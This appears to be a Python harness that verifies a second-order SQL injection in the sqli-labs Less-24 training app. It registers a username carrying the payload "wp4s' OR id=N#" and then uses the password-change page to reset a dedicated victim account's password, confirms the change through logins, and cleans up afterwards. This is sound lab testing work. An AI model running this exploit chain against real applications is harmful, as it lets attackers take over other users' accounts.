"""SQLI-005 Less-24 second-order SQL injection through registration/login/pass change.

The run first proves the normal registration, login and password change flow,
then registers a dedicated attacker name containing SQL syntax.  The name is
stored as data, returned into the session at login and later concatenated into
the UPDATE statement without escaping, so the attacker session can change a
different dedicated user's password without knowing it.
"""
from __future__ import annotations

import argparse
import json
import re
import sys
import urllib.parse
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from wp4lib import BASE_SQLI, SOURCE_COMMIT_SQLI, Client, Run, db_query, sha256_text  # noqa: E402

DEPLOYMENT = "sqli-labs-wsl-01"
VICTIM = "wp4v"
VICTIM_PASS = "wp4vpass"
VICTIM_PASS_2 = "wp4vpass2"
ATTACKER_PASS = "wp4spass"
INJECTED_PASS = "WP4NEWPASS"


def cleanup() -> None:
    db_query("DELETE FROM security.users WHERE username='wp4v' OR username LIKE 'wp4s%'")


def register(client: Client, username: str, password: str, run: Run, label: str):
    resp = client.post("/Less-24/login_create.php", {
        "username": username,
        "password": password,
        "re_password": password,
        "submit": "Register",
    })
    run.add_response(label, resp)
    return resp


def login(client: Client, username: str, password: str, run: Run, label: str):
    resp = client.post("/Less-24/login.php", {
        "login_user": username,
        "login_password": password,
        "mysubmit": "Login",
    })
    run.add_response(label, resp)
    return resp


def pass_change(client: Client, current: str, new: str, run: Run, label: str):
    resp = client.post("/Less-24/pass_change.php", {
        "current_password": current,
        "password": new,
        "re_password": new,
        "submit": "Reset",
    })
    run.add_response(label, resp)
    return resp


def user_row(username_like: str) -> list[list[str]]:
    return db_query(
        "SELECT id, username, password FROM security.users "
        f"WHERE username LIKE {sql_quote(username_like)} ORDER BY id")


def sql_quote(value: str) -> str:
    return "'" + value.replace("\\", "\\\\").replace("'", "''") + "'"


def session_username(html: str) -> str:
    match = re.search(r"<strong>\s*([^<]*?)\s*</strong>", html, re.S | re.I)
    return match.group(1).strip() if match else ""


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--keep", action="store_true", help="skip cleanup for inspection")
    args = parser.parse_args()

    run = Run(
        "wp4-20261019-sqli005-low", "SQLI-005", "Less-24 register/login/pass_change",
        "env=sqli-labs-wsl-01|role=anonymous|security=n/a|object=dedicated-wp4v|state=initialized",
        DEPLOYMENT, SOURCE_COMMIT_SQLI,
    )
    cleanup()
    observations: dict = {"steps": {}}

    victim_client = Client(BASE_SQLI)
    register(victim_client, VICTIM, VICTIM_PASS, run, "victim-register-normal")
    victim_rows = user_row(VICTIM)
    if not victim_rows:
        raise RuntimeError("victim registration failed")
    victim_id = victim_rows[0][0]
    observations["steps"]["victim_registered"] = {
        "id": victim_id,
        "password_sha256": sha256_text(VICTIM_PASS),
    }

    login(victim_client, VICTIM, VICTIM_PASS, run, "victim-login-normal")
    logged = victim_client.get("/Less-24/logged-in.php")
    run.add_response("victim-logged-in-normal", logged)
    observations["steps"]["normal_login"] = session_username(logged.text) == VICTIM

    normal_change = pass_change(victim_client, VICTIM_PASS, VICTIM_PASS_2, run,
                                "victim-pass-change-normal")
    victim_after_normal = user_row(VICTIM)
    observations["steps"]["normal_pass_change"] = {
        "reported_success": "Password successfully updated" in normal_change.text,
        "password_sha256_after": sha256_text(victim_after_normal[0][2]) if victim_after_normal else None,
        "changed": bool(victim_after_normal) and victim_after_normal[0][2] == VICTIM_PASS_2,
    }

    # Restore the victim password through the normal flow before the injection.
    victim_client2 = Client(BASE_SQLI)
    login(victim_client2, VICTIM, VICTIM_PASS_2, run, "victim-login-after-normal-change")
    pass_change(victim_client2, VICTIM_PASS_2, VICTIM_PASS, run, "victim-pass-restore-normal")
    victim_restored = user_row(VICTIM)
    observations["steps"]["normal_flow_restored"] = bool(victim_restored) and victim_restored[0][2] == VICTIM_PASS

    # Dedicated attacker username: stored as data, later reused as SQL syntax.
    payload = f"wp4s' OR id={victim_id}#"
    if len(payload) > 20:
        raise RuntimeError(f"payload too long for varchar(20): {len(payload)}")
    attacker_client = Client(BASE_SQLI)
    register(attacker_client, payload, ATTACKER_PASS, run, "attacker-register-payload")
    attacker_rows = user_row("wp4s%")
    observations["steps"]["attacker_registered"] = {
        "payload": payload,
        "payload_length": len(payload),
        "stored_username": attacker_rows[0][1] if attacker_rows else None,
    }
    if not attacker_rows or attacker_rows[0][1] != payload:
        raise RuntimeError("attacker payload was not stored verbatim")

    login_resp = login(attacker_client, payload, ATTACKER_PASS, run, "attacker-login-payload")
    logged_attacker = attacker_client.get("/Less-24/logged-in.php")
    run.add_response("attacker-logged-in", logged_attacker)
    observations["steps"]["attacker_session"] = {
        "login_status": login_resp.status,
        "login_location": login_resp.header("Location"),
        "session_username_contains_payload": payload in logged_attacker.text,
    }

    before = user_row(VICTIM)[0]
    inject_resp = pass_change(attacker_client, "irrelevant-current-password", INJECTED_PASS,
                              run, "attacker-pass-change-injected")
    after = user_row(VICTIM)[0]
    attacker_after = user_row("wp4s%")[0]
    observations["steps"]["injected_update"] = {
        "reported_success": "Password successfully updated" in inject_resp.text,
        "victim_password_changed": before[2] != after[2] and after[2] == INJECTED_PASS,
        "victim_password_sha256_before": sha256_text(before[2]),
        "victim_password_sha256_after": sha256_text(after[2]),
        "attacker_password_unchanged": attacker_after[2] == ATTACKER_PASS,
        "current_password_supplied": "<not-the-victim-password>",
    }

    # Independent effect check: old password must fail, new password must succeed.
    old_client = Client(BASE_SQLI)
    login(old_client, VICTIM, VICTIM_PASS, run, "victim-login-old-after-injection")
    old_ok = old_client.get("/Less-24/logged-in.php")
    run.add_response("victim-logged-in-old-after-injection", old_ok)
    new_client = Client(BASE_SQLI)
    login(new_client, VICTIM, INJECTED_PASS, run, "victim-login-new-after-injection")
    new_ok = new_client.get("/Less-24/logged-in.php")
    run.add_response("victim-logged-in-new-after-injection", new_ok)
    observations["steps"]["independent_login_check"] = {
        "old_password_rejected": session_username(old_ok.text) == "",
        "new_password_accepted": session_username(new_ok.text) == VICTIM,
        "old_session_username": session_username(old_ok.text),
        "new_session_username": session_username(new_ok.text),
    }

    if not args.keep:
        cleanup()
    remaining = user_row("wp4%")
    observations["cleanup"] = {
        "deleted_dedicated_users": not remaining,
        "remaining_rows": len(remaining),
    }
    run.restore_result = {
        "required": True,
        "action": "delete dedicated wp4v/wp4s test users created by this run",
        "result": "restored" if not remaining else "failed",
        "remaining_rows": len(remaining),
    }
    run.requests.extend(victim_client.requests)
    run.requests.extend(victim_client2.requests)
    run.requests.extend(attacker_client.requests)
    run.requests.extend(old_client.requests)
    run.requests.extend(new_client.requests)

    run.observation = observations
    run.success_criteria = [
        "Normal registration, login and password change complete for a dedicated user.",
        "The dedicated attacker name is stored verbatim and returned into the session by login.",
        "An UPDATE issued from the attacker session changes a different dedicated user's password.",
        "The attacker supplies no valid current password for the victim.",
        "Independent login checks show the victim's old password fails and the injected password works.",
        "Dedicated test users are removed after the run.",
    ]
    run.limitations = [
        "Only the Less-24 registration/login/pass-change chain is covered.",
        "The deployment uses PHP 5.6 with ext/mysql and MariaDB 10.6; other versions are out of scope.",
        "The victim is a dedicated account, not a pre-existing administrator.",
    ]
    triggered = (
        observations["steps"]["normal_pass_change"]["changed"]
        and observations["steps"]["normal_flow_restored"]
        and observations["steps"]["attacker_session"]["session_username_contains_payload"]
        and observations["steps"]["injected_update"]["victim_password_changed"]
        and observations["steps"]["independent_login_check"]["old_password_rejected"]
        and observations["steps"]["independent_login_check"]["new_password_accepted"]
        and observations["cleanup"]["deleted_dedicated_users"]
    )
    run.finalize("触发" if triggered else "未触发", "有漏洞" if triggered else "证据不足")
    print(json.dumps({"victim_id": victim_id, "payload": payload}, ensure_ascii=False))


if __name__ == "__main__":
    main()
